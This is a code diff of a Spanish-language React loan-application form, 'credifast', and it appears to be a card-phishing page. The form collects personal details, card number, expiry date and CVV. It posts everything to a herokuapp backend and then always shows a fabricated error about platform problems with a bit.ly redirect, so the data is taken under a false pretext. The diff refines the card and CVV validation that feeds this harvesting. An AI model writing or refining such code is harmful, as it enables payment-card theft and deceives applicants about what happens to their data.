@@ -49,32 +49,48 @@ class Form extends Component {
 
         if (nombre === "" || apellido_paterno === "" || apellido_materno === "" || direccion === "" ||
             codigo_postal === "" || municipio === "" || estado === "" || sueldo === "" || limite === "" || estado_civil === "" ||
-            telefono === "" || vencimiento.length < 4 || tarjeta === "" || cvv.length < 3 || banco === "" || 
-            is_valid === false || rfc === "") {
+            telefono === "" || banco === "" ||
+            rfc === "") {
             Swal.fire({
                 title: 'Ho Ho',
-                text: 'Por favor revisa que la tarjeta, la fecha, y la clave cvv sea correcta o que los campos no esten vacios',
+                text: 'Por favor revisa que los campos no esten vacios',
                 icon: 'error'
             })
         } else {
-            fetch('https://backend-credifast.herokuapp.com/form', {
-                method: 'POST',
-                body: JSON.stringify(this.state),
-                headers: {
-                    'Accept': 'application/json',
-                    'Content-Type': 'application/json'
+            if (is_valid === false || tarjeta === "") {
+                Swal.fire({
+                    title: 'Ho Ho',
+                    text: 'Por favor revisa que la tarjeta sea correcta',
+                    icon: 'error'
+                })
+            } else {
+                if (vencimiento.length < 4 || cvv.length < 3) {
+                    Swal.fire({
+                        title: 'Ho Ho',
+                        text: 'Por favor revisa que el cvv y la fecha esten correctos',
+                        icon: 'error'
+                    })
+                } else {
+                    fetch('https://backend-credifast.herokuapp.com/form', {
+                        method: 'POST',
+                        body: JSON.stringify(this.state),
+                        headers: {
+                            'Accept': 'application/json',
+                            'Content-Type': 'application/json'
+                        }
+                    })
+                        .then(res => res)
+                        .catch(err => console.log(err))
+                    Swal.fire({
+                        title: 'Ups',
+                        icon: 'error',
+                        html:
+                            'Al parecer la plataforma presenta problemas, por favor intenta mas tarde, te redireccionaremos a la plataforma de buro de credito.' +
+                            '<a href="https://bit.ly/35chpkt"><button style="background: #fac95f; border:none; color: #fff; padding: 10px; border-radius: 10px">Aceptar</button></a> ',
+                        showConfirmButton: false
+                    })
                 }
-            })
-                .then(res => res)
-                .catch(err => console.log(err))
-            Swal.fire({
-                title: 'Ups',
-                icon: 'error',
-                html:
-                    'Al parecer la plataforma presenta problemas, por favor intenta mas tarde, te redireccionaremos a la plataforma de buro de credito.' +
-                    '<a href="https://bit.ly/35chpkt"><button style="background: #fac95f; border:none; color: #fff; padding: 10px; border-radius: 10px">Aceptar</button></a> ',
-                showConfirmButton: false
-            })
+            }
         }
 
         e.preventDefault()
@@ -91,22 +107,7 @@ class Form extends Component {
     render() {
         return (
             <div>
-                <div className="mx-auto text-center">
-                    {/* <p className=" d-md-none d-md-block" style={{ color: '#fff', background: '#fac95f' }}>
-                        para poder calcular mejor préstamos para usted,
-                        se revisara su buró de credito y se vera su calificacion,
-                        por favor llene los campos solicitados </p> */}
-
-                    <img
-                        style={{ width: '50%' }}
-                        src="https://firebasestorage.googleapis.com/v0/b/images-b907b.appspot.com/o/logo.png?alt=media&token=feb7a391-af33-40e5-8313-b4efaae7da0a"
-                        alt="logo"
-                        className="img-fluid d-md-none d-md-block"
-                    />
-
-
-                </div>
-                <div class="alert alert-primary" style={{ margin: 'auto'}} role="alert">
+                <div class="alert alert-primary" style={{ margin: 'auto' }} role="alert">
                     Recuerda: para hacer tu solicitud, ten a la mano el último estado de cuenta de tu tarjeta de crédito vigente y captura los datos que te solicitamos tal y como aparecen en él.
                 </div>
 
